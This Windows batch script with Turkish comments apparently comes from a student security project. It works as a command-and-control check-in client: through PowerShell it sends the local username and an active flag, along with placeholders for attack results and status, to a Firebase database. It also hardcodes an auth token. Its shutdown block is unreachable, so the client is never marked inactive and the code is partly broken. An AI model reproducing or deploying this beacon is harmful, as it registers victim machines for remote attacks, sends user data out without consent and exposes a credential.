@echo off
setlocal

:: Kullanıcı adını alalım
set username=%USERNAME%

:: İlk isActive değerini true olarak gönderelim
powershell "$isActive = $true; $info = @{ 'isActive' = $isActive; 'attack' = @{ 'attack_result' = 'Result will be here'; 'attack_status' = 'Status will be here' }; }; $url = 'https://cybersecurityfinalproject-default-rtdb.firebaseio.com/client/%username%.json?auth=9Q6otjqjipf5Sczouqxxqn507B9eau2V8btKxKpJ'; Invoke-RestMethod -Uri $url -Method PUT -ContentType 'application/json' -Body ($info | ConvertTo-Json)"

:loop
:: Burada, program kullanıcı tarafından kapatılana kadar döngüde kalacak
timeout /t 86400 /nobreak >nul
goto loop

:end
:: Kullanıcı pencereyi kapattığında, isActive değerini false olarak güncelleyelim
powershell "$isActive = $false; $info = @{ 'isActive' = $isActive; 'attack' = @{ 'attack_result' = 'Result will be here'; 'attack_status' = 'Status will be here' }; }; $url = 'https://cybersecurityfinalproject-default-rtdb.firebaseio.com/client/%username%.json?auth=9Q6otjqjipf5Sczouqxxqn507B9eau2V8btKxKpJ'; Invoke-RestMethod -Uri $url -Method PUT -ContentType 'application/json' -Body ($info | ConvertTo-Json)"
